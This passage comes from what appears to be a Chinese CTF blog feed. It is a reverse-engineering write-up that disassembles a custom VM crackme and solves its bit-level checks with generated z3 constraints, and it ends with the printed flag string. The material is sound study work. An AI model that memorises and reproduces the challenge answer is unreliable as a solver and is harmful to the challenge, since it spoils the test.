style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    cnt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jmp2_code&lt;/span&gt;(op_code):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; int&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_bytes(op_code, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;little&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8000&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; op_code &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jmp2_op&lt;/span&gt;(op_code, args):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; cnt
    pc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_bytes(op_code, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;little&amp;#39;&lt;/span&gt;) 
    addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1FF&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (memory[(addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;cnt&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; goto &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;cnt &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((pc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;cnt&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; nop&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; if ((mem[ &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ] &amp;gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ) &amp;amp; 1) != 0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (cnt, addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;goto &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;cnt&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;((pc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3f&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    cnt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;


basic_io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; OPCode(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, basic_io_code, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, basic_io_op)
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Reader(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;program&amp;#39;&lt;/span&gt;)
jmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; OPCode(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, jmp_code, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, jmp_op)
jmp2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; OPCode(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, jmp2_code, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, jmp2_op)
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_asm(basic_io)
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_asm(jmp)
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_asm(jmp2)
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;分析指令&#34;&gt;分析指令&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0 print P
2 print l
4 print e
6 print a
8 print s
10 print e
12 print \x20
14 print i
16 print n
18 print p
20 print u
22 print t
24 print \x20
26 print y
28 print o
30 print u
32 print r
34 print \x20
36 print f
38 print l
40 print a
42 print g
44 print :
46 print \x20
48 mem[0] = &amp;lt;input&amp;gt;
50 mem[1] = &amp;lt;input&amp;gt;
52 mem[2] = &amp;lt;input&amp;gt;
54 mem[3] = &amp;lt;input&amp;gt;
56 mem[4] = &amp;lt;input&amp;gt;
58 mem[5] = &amp;lt;input&amp;gt;
60 mem[6] = &amp;lt;input&amp;gt;
62 mem[7] = &amp;lt;input&amp;gt;
64 mem[8] = &amp;lt;input&amp;gt;
66 mem[9] = &amp;lt;input&amp;gt;
68 mem[10] = &amp;lt;input&amp;gt;
70 mem[11] = &amp;lt;input&amp;gt;
72 mem[12] = &amp;lt;input&amp;gt;
74 mem[13] = &amp;lt;input&amp;gt;
76 mem[14] = &amp;lt;input&amp;gt;
78 mem[15] = &amp;lt;input&amp;gt;
80 mem[16] = &amp;lt;input&amp;gt;
82 mem[17] = &amp;lt;input&amp;gt;
84 mem[18] = &amp;lt;input&amp;gt;
86 mem[19] = &amp;lt;input&amp;gt;
88 mem[20] = &amp;lt;input&amp;gt;
90 mem[21] = &amp;lt;input&amp;gt;
92 mem[22] = &amp;lt;input&amp;gt;
94 mem[23] = &amp;lt;input&amp;gt;
96 mem[24] = &amp;lt;input&amp;gt;
98 mem[25] = &amp;lt;input&amp;gt;
100 mem[26] = &amp;lt;input&amp;gt;
102 mem[27] = &amp;lt;input&amp;gt;
104 mem[28] = &amp;lt;input&amp;gt;
106 mem[29] = &amp;lt;input&amp;gt;
108 mem[30] = &amp;lt;input&amp;gt;
110 mem[31] = &amp;lt;input&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分是简单的输出和输入，直接看二进制文件的字节也能看出来&lt;/p&gt;
&lt;p&gt;然后是输入的判断部分&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;112 if ((mem[ 12 ] &amp;gt;&amp;gt; 5 ) &amp;amp; 1) != 0 goto 125
113 nop
114 if ((mem[ 19 ] &amp;gt;&amp;gt; 2 ) &amp;amp; 1) == 0 goto 125
115 print N
117 print o
119 print !
121 print \x0a
123 exit(0)
125 goto 127
126 if ((mem[ 22 ] &amp;gt;&amp;gt; 6 ) &amp;amp; 1) != 0 goto 146
127 goto 131
128 if ((mem[ 1 ] &amp;gt;&amp;gt; 1 ) &amp;amp; 1) != 0 goto 140
129 if ((mem[ 0 ] &amp;gt;&amp;gt; 3 ) &amp;amp; 1) != 0 goto 140
130 b&#39;\xff\xff&#39;
131 goto 133
132 b&#39;\xff\xff&#39;
133 if ((mem[ 30 ] &amp;gt;&amp;gt; 5 ) &amp;amp; 1) == 0 goto 146
134 nop
135 nop
136 print N
138 print o
140 print !
142 print \x0a
144 exit(0)
146 nop
147 if ((mem[ 6 ] &amp;gt;&amp;gt; 4 ) &amp;amp; 1) != 0 goto 169
148 goto 150
149 b&#39;\xff\xff&#39;
150 goto 154
151 if ((mem[ 0 ] &amp;gt;&amp;gt; 4 ) &amp;amp; 1) == 0 goto 163
152 if ((mem[ 3 ] &amp;gt;&amp;gt; 0 ) &amp;amp; 1) != 0 goto 163
153 b&#39;\xff\xff&#39;
154 if ((mem[ 8 ] &amp;gt;&amp;gt; 0 ) &amp;amp; 1) == 0 goto 169
155 goto 159
156 if ((mem[ 1 ] &amp;gt;&amp;gt; 0 ) &amp;amp; 1) == 0 goto 168
157 if ((mem[ 1 ] &amp;gt;&amp;gt; 7 ) &amp;amp; 1) != 0 goto 168
158 b&#39;\xff\xff&#39;
159 print N
161 print o
163 print !
165 print \x0a
167 exit(0)
169 if ((mem[ 4 ] &amp;gt;&amp;gt; 4 ) &amp;amp; 1) != 0 goto 190
170 goto 172
171 b&#39;\xff\xff&#39;
172 if ((mem[ 20 ] &amp;gt;&amp;gt; 0 ) &amp;amp; 1) == 0 goto 190
173 nop
174 b&#39;\xff\xff&#39;
175 if ((mem[ 2 ] &amp;gt;&amp;gt; 1 ) &amp;amp; 1) != 0 goto 179 ; 由于ffff后会直接跳过下一个，所以这一句也没有用
176 goto 180
177 if ((mem[ 1 ] &amp;gt;&amp;gt; 3 ) &amp;amp; 1) != 0 goto 189
178 if ((mem[ 3 ] &amp;gt;&amp;gt; 3 ) &amp;amp; 1) == 0 goto 189
179 b&#39;\xff\xff&#39;
180 print N
182 print o
184 print !
186 print \x0a
188 exit(0)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;二进制文件中出现了很多奇奇怪怪的 &lt;code&gt;\xFF\xFF&lt;/code&gt;，感觉起到了一部分的花指令作用，所以对于不满足的情况全部拆开处理了，但这又导致读取后的逻辑不是很清晰，需要进行简单的手动分析&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;程序中 &lt;code&gt;if ((mem[ 1 ] &amp;gt;&amp;gt; 3 ) &amp;amp; 1) != 0&lt;/code&gt; 之间空格实际上是为了后续进一步读取准备的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;分析时可以看出，flag的判断逻辑显然是对输入的每一比特加了限定，目的就是跳过所有的退出&lt;/p&gt;
&lt;p&gt;对这一部分手动分析，删掉没有用的部分&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;112 if ((mem[ 12 ] &amp;gt;&amp;gt; 5 ) &amp;amp; 1) != 0 goto 125
114 if ((mem[ 19 ] &amp;gt;&amp;gt; 2 ) &amp;amp; 1) == 0 goto 125
115 print No!
123 exit(0)
125 goto 127
126 if ((mem[ 22 ] &amp;gt;&amp;gt; 6 ) &amp;amp; 1) != 0 goto 146 ; 这句话也没有用，但自动提取时不容易处理，仍然保留
127 goto 131
131 goto 133
133 if ((mem[ 30 ] &amp;gt;&amp;gt; 5 ) &amp;amp; 1) == 0 goto 146
136 print No!
144 exit(0)
146 nop
147 if ((mem[ 6 ] &amp;gt;&amp;gt; 4 ) &amp;amp; 1) != 0 goto 169
148 goto 150
150 goto 154
154 if ((mem[ 8 ] &amp;gt;&amp;gt; 0 ) &amp;amp; 1) == 0 goto 169
155 goto 159
159 print No!
167 exit(0)
169 if ((mem[ 4 ] &amp;gt;&amp;gt; 4 ) &amp;amp; 1) != 0 goto 190
170 goto 172
172 if ((mem[ 20 ] &amp;gt;&amp;gt; 0 ) &amp;amp; 1) == 0 goto 190
173 nop
176 goto 180
180 print No!
188 exit(0)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到，可用的跳转一定是跳转到exit后面的，这样就可以实现一个自动化脚本了&lt;/p&gt;
&lt;p&gt;&lt;code&gt;extract.py&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;infile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1.txt&amp;#39;&lt;/span&gt;)

code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; infile&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; line &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; code:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exit&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; line:
        target&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(str(int(line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;))

&lt;span style=&#34;color:#75715e&#34;&gt;# print (target)&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; line &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; code:
    tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; tmp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; target:
        print (line)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后再自动生成一个z3脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;(in_list):
    ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; in_list[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;==&amp;#39;&lt;/span&gt;:
        ret &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eq(&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; in_list[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;!=&amp;#39;&lt;/span&gt;:
        ret &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;neq(&amp;#39;&lt;/span&gt;
    ret &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; in_list[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; in_list[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
    ret &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ret

infile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2.txt&amp;#39;&lt;/span&gt;)

print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;from z3 import *
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;s = Solver()
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;flag = [BitVec(&amp;#39;flag&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;% i&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, 8) for i in range(32)]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;for f in flag:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    s.add(f &amp;gt; 0x20)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    s.add(f &amp;lt; 0x7f)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;def eq(pos_f, pos_b):
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    return flag[pos_f] &amp;amp; (1 &amp;lt;&amp;lt; pos_b) == 0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;def neq(pos_f, pos_b):
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    return flag[pos_f] &amp;amp; (1 &amp;lt;&amp;lt; pos_b) != 0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;)

lines &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; infile&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
lines &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lines&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, len(lines) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
    a, b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; lines[i], lines[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
    a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
    b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
    a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [a[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;], a[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;], a[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]]
    b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [b[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;], b[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;], b[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]]
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s.add(Or(&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fmt(a) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fmt(b) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;))&amp;#39;&lt;/span&gt;)


print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;if s.check() == sat:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    model = s.model()
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    for f in flag:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        print (chr(model[f].as_long().real), end = &amp;#39;&amp;#39;)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;print (&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;nfinish&amp;#39;)&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行之后就可以得到flag了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# python3 vmreader.py &amp;gt; 1.txt&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# python3 extract.py &amp;gt; 2.txt&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# python3 to_py.py &amp;gt; 3.py&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# python3 3.py&lt;/span&gt;
flag&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;_2_SAT_15_a_P_pr0b13M_4F6v&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
finish
&lt;span style=&#34;color:#75715e&#34;&gt;# ./vs&lt;/span&gt;
Please input your flag: flag&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;_2_SAT_15_a_P_pr0b13M_4F6v&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
Congratulation!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过程序验证&lt;/p&gt;
&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
&lt;p&gt;还是第一次在一个逆向题目中写这么多代码，最近又看到一些需要写代码的题目，还是需要提高开发能力啊&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Reverse from 1 to 2</title>
        <link>/post/reverse-from-1-to-2/</link>
        <pubDate>Wed, 26 May 2021 23:54:09 +0000</pubDate>
        
        <guid>/post/reverse-from-1-to-2/</guid>
